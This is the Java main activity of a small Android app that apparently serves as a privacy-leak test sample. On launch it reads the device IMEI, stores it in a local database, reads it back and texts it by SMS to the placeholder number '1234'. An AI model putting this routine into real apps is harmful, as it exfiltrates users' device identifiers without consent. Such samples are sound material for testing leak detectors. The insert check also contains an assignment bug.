package com.example.shiva.leakviastorage;

import android.content.Context;
import android.database.Cursor;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    Databasehelper imeiDb;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        imeiDb=new Databasehelper(this);
        String imei=getImei();
        uploadToDb(imei);
        leakImei(getFromDb());
    }

    public String getImei()
    {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String imei = telephonyManager.getDeviceId(); // Source
        return imei;
    }

    public void uploadToDb(String str)
    {
        boolean isInserted=imeiDb.insertData(str);
        if (isInserted=true) {
            Toast.makeText(MainActivity.this, "Data Inserted"+str, Toast.LENGTH_LONG).show();
        }
        else
            Toast.makeText(MainActivity.this,"Data not Inserted",Toast.LENGTH_LONG).show();
    }

    public String getFromDb()
    {
        String imei="";
        Cursor res=imeiDb.getData();
        while (res.moveToNext())
        {
            imei=res.getString(0);
        }
        return imei;
    }

    public void leakImei(String imei)
    {
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("1234", null, imei, null, null);
    }

}
